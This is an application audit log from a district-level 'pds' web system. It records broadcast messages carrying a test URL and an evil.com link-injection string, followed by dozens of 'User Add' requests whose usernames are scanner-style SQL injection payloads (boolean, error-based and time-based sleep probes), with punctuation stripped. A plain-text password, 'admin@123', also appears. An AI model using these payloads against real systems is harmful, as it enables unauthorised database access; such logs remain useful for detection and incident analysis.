[2025-03-18 16:12:20] User -> Send  Message ->admin@pds| Requested JSON -> {"message":"httptestphp.vulnweb.com","uniqueid":"67b617a1a9aa7"} | Bagalkote@pds
[2025-03-18 16:13:09] User -> Send  Message ->admin@pds| Requested JSON -> {"message":"httptestphp.vulnweb.com","uniqueid":"67b617a1a9aa7"} | Bagalkote@pds
[2025-03-18 16:13:24] User -> Delete Message ->admin@pds| Requested JSON -> httptestphp.vulnweb.com | Bagalkote@pds
[2025-03-18 16:13:57] User -> Send  Message ->admin@pds| Requested JSON -> {"message":"httptestphp.vulnweb.com","uniqueid":"67b617a1a9aa7"} | Bagalkote@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Bagalkote@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Ballari@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Bangalore@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Belagavi@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Bengaluru Rural@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Bidar@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Chamarajanagara@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Chikkaballapura@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Chikkamagaluru@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Chitradurga@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Dakshina Kannada@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Davanagere@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Dharwad@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Gadag@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Hassan@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Haveri@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Kalaburagi@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Kodagu@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Kolar@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Koppal@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Mandya@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Mysuru@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Raichur@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Ramanagara@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Shivamogga@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Tumakuru@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Udupi@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Uttara Kannada@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Vijayanagar@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Vijayapura@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | Yadgir@pds
[2025-03-18 16:15:39] User -> Send Message ->admin@pds| Requested JSON ->{"message":"httptestphp.vulnweb.com","uniqueid":"all"} | testing
[2025-03-18 16:15:39] User -> Send  Message ->admin@pds| Requested JSON -> {"message":"httptestphp.vulnweb.com","uniqueid":"all"} | testing
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Bagalkote@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Ballari@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Bangalore@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Belagavi@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Bengaluru Rural@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Bidar@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Chamarajanagara@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Chikkaballapura@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Chikkamagaluru@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Chitradurga@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Dakshina Kannada@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Davanagere@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Dharwad@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Gadag@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Hassan@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Haveri@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Kalaburagi@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Kodagu@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Kolar@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Koppal@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Mandya@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Mysuru@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Raichur@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Ramanagara@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Shivamogga@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Tumakuru@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Udupi@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Uttara Kannada@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Vijayanagar@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Vijayapura@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | Yadgir@pds
[2025-03-18 16:17:52] User -> Send Message ->admin@pds| Requested JSON ->{"message":"a hrefevil.comTestinga","uniqueid":"all"} | testing
[2025-03-18 16:17:52] User -> Send  Message ->admin@pds| Requested JSON -> {"message":"a hrefevil.comTestinga","uniqueid":"all"} | testing
[2025-03-18 16:49:16] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin","district":"Bagalkote","newpassword":"admin@123"} | admin
[2025-03-18 16:49:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"9020","district":"Bagalkote","newpassword":"admin@123"} | 9020
[2025-03-18 16:49:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin..","district":"Bagalkote","newpassword":"admin@123"} | admin..
[2025-03-18 16:49:27] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminBDlMkxfXtQsw","district":"Bagalkote","newpassword":"admin@123"} | adminBDlMkxfXtQsw
[2025-03-18 16:49:28] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 18577837 AND 55005500","district":"Bagalkote","newpassword":"admin@123"} | admin AND 18577837 AND 55005500
[2025-03-18 16:49:28] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 45326902","district":"Bagalkote","newpassword":"admin@123"} | admin AND 45326902
[2025-03-18 16:49:28] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 34979233 AND egDyegDy","district":"Bagalkote","newpassword":"admin@123"} | admin AND 34979233 AND egDyegDy
[2025-03-18 16:49:29] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 76862145 AND vnIFvnIF","district":"Bagalkote","newpassword":"admin@123"} | admin AND 76862145 AND vnIFvnIF
[2025-03-18 16:49:29] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 56267439-- Omuj","district":"Bagalkote","newpassword":"admin@123"} | admin AND 56267439-- Omuj
[2025-03-18 16:49:29] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECT CASE WHEN 76386992 THEN admin ELSE SELECT 6992 UNION SELECT 9428 END","district":"Bagalkote","newpassword":"admin@123"} | SELECT CASE WHEN 76386992 THEN admin ELSE SELECT 6992 UNION SELECT 9428 END
[2025-03-18 16:49:29] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071 AND 41564156","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071 AND 41564156
[2025-03-18 16:49:29] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071
[2025-03-18 16:49:30] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071 AND MrIbMrIb","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071 AND MrIbMrIb
[2025-03-18 16:49:30] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071 AND vgravgra","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071 AND vgravgra
[2025-03-18 16:49:30] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071-- hgcP","district":"Bagalkote","newpassword":"admin@123"} | admin AND EXTRACTVALUE5432CONCAT0x5c0x71626a7071SELECT ELT5432543210x717a767071-- hgcP
[2025-03-18 16:49:30] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC AND 49764976","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC AND 49764976
[2025-03-18 16:49:30] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC
[2025-03-18 16:49:30] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC AND DXZWDXZW","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC AND DXZWDXZW
[2025-03-18 16:49:31] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC AND YzebYzeb","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC AND YzebYzeb
[2025-03-18 16:49:31] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC-- sPmk","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1701CASTCHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 17011701 THEN 1 ELSE 0 ENDtextCHR113CHR122CHR118CHR112CHR113 AS NUMERIC-- sPmk
[2025-03-18 16:49:31] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113 AND 87968796","district":"Bagalkote","newpassword":"admin@123"} | admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113 AND 87968796
[2025-03-18 16:49:31] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113","district":"Bagalkote","newpassword":"admin@123"} | admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113
[2025-03-18 16:49:31] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113 AND ChcbChcb","district":"Bagalkote","newpassword":"admin@123"} | admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113 AND ChcbChcb
[2025-03-18 16:49:32] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113 AND pSnSpSnS","district":"Bagalkote","newpassword":"admin@123"} | admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113 AND pSnSpSnS
[2025-03-18 16:49:32] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113-- avyd","district":"Bagalkote","newpassword":"admin@123"} | admin AND 4897 IN SELECT CHAR113CHAR98CHAR106CHAR112CHAR113SELECT CASE WHEN 48974897 THEN CHAR49 ELSE CHAR48 ENDCHAR113CHAR122CHAR118CHAR112CHAR113-- avyd
[2025-03-18 16:49:32] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL AND 41504150","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL AND 41504150
[2025-03-18 16:49:32] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL
[2025-03-18 16:49:32] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL AND wcDGwcDG","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL AND wcDGwcDG
[2025-03-18 16:49:32] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL AND YsrxYsrx","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL AND YsrxYsrx
[2025-03-18 16:49:33] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL-- KfLp","district":"Bagalkote","newpassword":"admin@123"} | admin AND 6244SELECT UPPERXMLTypeCHR60CHR58CHR113CHR98CHR106CHR112CHR113SELECT CASE WHEN 62446244 THEN 1 ELSE 0 END FROM DUALCHR113CHR122CHR118CHR112CHR113CHR62 FROM DUAL-- KfLp
[2025-03-18 16:49:33] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"SELECT CONCATCONCATqbjpqCASE WHEN 33323332 THEN 1 ELSE 0 ENDqzvpq","district":"Bagalkote","newpassword":"admin@123"} | SELECT CONCATCONCATqbjpqCASE WHEN 33323332 THEN 1 ELSE 0 ENDqzvpq
[2025-03-18 16:49:33] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminSELECT PG_SLEEP5--","district":"Bagalkote","newpassword":"admin@123"} | adminSELECT PG_SLEEP5--
[2025-03-18 16:49:34] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminWAITFOR DELAY 005--","district":"Bagalkote","newpassword":"admin@123"} | adminWAITFOR DELAY 005--
[2025-03-18 16:49:34] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"adminSELECT DBMS_PIPE.RECEIVE_MESSAGECHR90CHR88CHR114CHR895 FROM DUAL--","district":"Bagalkote","newpassword":"admin@123"} | adminSELECT DBMS_PIPE.RECEIVE_MESSAGECHR90CHR88CHR114CHR895 FROM DUAL--
[2025-03-18 16:49:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT AND 37943794","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT AND 37943794
[2025-03-18 16:49:35] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT
[2025-03-18 16:49:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT AND hgeChgeC","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT AND hgeChgeC
[2025-03-18 16:49:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT AND EETWEETW","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT AND EETWEETW
[2025-03-18 16:49:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT-- iFqe","district":"Bagalkote","newpassword":"admin@123"} | admin AND SELECT 7550 FROM SELECTSLEEP5ZRfT-- iFqe
[2025-03-18 16:49:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1198SELECT 1198 FROM PG_SLEEP5 AND 88588858","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1198SELECT 1198 FROM PG_SLEEP5 AND 88588858
[2025-03-18 16:49:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1198SELECT 1198 FROM PG_SLEEP5","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1198SELECT 1198 FROM PG_SLEEP5
[2025-03-18 16:49:36] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1198SELECT 1198 FROM PG_SLEEP5 AND YsmyYsmy","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1198SELECT 1198 FROM PG_SLEEP5 AND YsmyYsmy
[2025-03-18 16:49:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1198SELECT 1198 FROM PG_SLEEP5 AND wJbKwJbK","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1198SELECT 1198 FROM PG_SLEEP5 AND wJbKwJbK
[2025-03-18 16:49:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 1198SELECT 1198 FROM PG_SLEEP5-- UMpe","district":"Bagalkote","newpassword":"admin@123"} | admin AND 1198SELECT 1198 FROM PG_SLEEP5-- UMpe
[2025-03-18 16:49:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005 AND 16381638","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005 AND 16381638
[2025-03-18 16:49:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005
[2025-03-18 16:49:37] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005 AND hdzvhdzv","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005 AND hdzvhdzv
[2025-03-18 16:49:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005 AND NxnSNxnS","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005 AND NxnSNxnS
[2025-03-18 16:49:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin WAITFOR DELAY 005-- soCi","district":"Bagalkote","newpassword":"admin@123"} | admin WAITFOR DELAY 005-- soCi
[2025-03-18 16:49:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125 AND 55575557","district":"Bagalkote","newpassword":"admin@123"} | admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125 AND 55575557
[2025-03-18 16:49:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125","district":"Bagalkote","newpassword":"admin@123"} | admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125
[2025-03-18 16:49:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125 AND wjsbwjsb","district":"Bagalkote","newpassword":"admin@123"} | admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125 AND wjsbwjsb
[2025-03-18 16:49:38] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125 AND CwvwCwvw","district":"Bagalkote","newpassword":"admin@123"} | admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125 AND CwvwCwvw
[2025-03-18 16:49:39] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125-- ralk","district":"Bagalkote","newpassword":"admin@123"} | admin AND 8974DBMS_PIPE.RECEIVE_MESSAGECHR81CHR79CHR102CHR1125-- ralk
[2025-03-18 16:49:41] User -> User Add ->admin@pds| Requested JSON -> {"newusername":"admin ORDER BY 1-- PHqC","district":"Bagalkote","newpassword":"admin@123"} | admin ORDER BY 1-- PHqC
